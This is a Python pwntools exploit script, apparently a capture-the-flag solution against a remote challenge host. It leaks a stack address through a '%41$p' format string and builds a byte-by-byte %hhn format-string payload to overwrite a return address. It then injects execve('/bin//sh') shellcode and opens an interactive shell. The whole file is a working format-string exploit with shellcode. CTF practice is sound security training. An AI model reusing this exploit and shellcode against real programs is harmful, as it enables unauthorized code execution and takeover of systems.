from pwn import *
import time

#p = process( './nothing-26b04ea96b5042f561f666beef1870de15d6b048b43dfca877b01ceef1fa82b0' )
p = remote( 'pwn02.chal.ctf.westerns.tokyo', 18247 )

sh = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

p.recvuntil( '> ' )
p.sendline( '%41$p' )

rsp = int( p.recvline()[:-1], 16 ) - 0x1e8
info( 'rsp : ' +  hex(rsp) )
info( 'target : ' + hex( rsp + 0x20 ) )
info( 'ch_add : ' + hex( rsp + 0x108 ) )

def fmt( prev, val, idx ):
        result = b''
        if prev < val:
                result += b'%' + bytes( str( val - prev ), 'utf-8' ) + b'c'
        elif prev == val:
                result += b''
        else:
                result += b'%' + bytes( str( val - prev + 256 ), 'utf-8' ) + b'c'
        result += b'%' + bytes( str( idx ), 'utf-8' ) + b'$hhn'
        return result

target = rsp + 0x20
prev = 0

payload = b''

for i in range( 6 ):
        payload += fmt( prev, ( target >> i * 8) &0xff, i + 16 )
        prev = target >> ( i * 8 ) & 0xff

payload = payload.ljust( 0x50, b'a' ) + p64( rsp + 0x108 ) + p64( rsp + 0x108 + 1 ) + p64( rsp + 0x108 + 2 ) + p64( rsp + 0x108 + 3 ) + p64( rsp + 0x108 + 4 ) + p64( rsp + 0x108 + 5 )
print( len( payload ) )
print( payload )
p.recvuntil( '> ' )
#raw_input()
p.sendline( payload )
time.sleep( 0.5 )

p.recvuntil( '> ' )
#raw_input()
payload = b'q' + b'a' * 0x1f + sh
p.sendline( payload )

p.interactive()

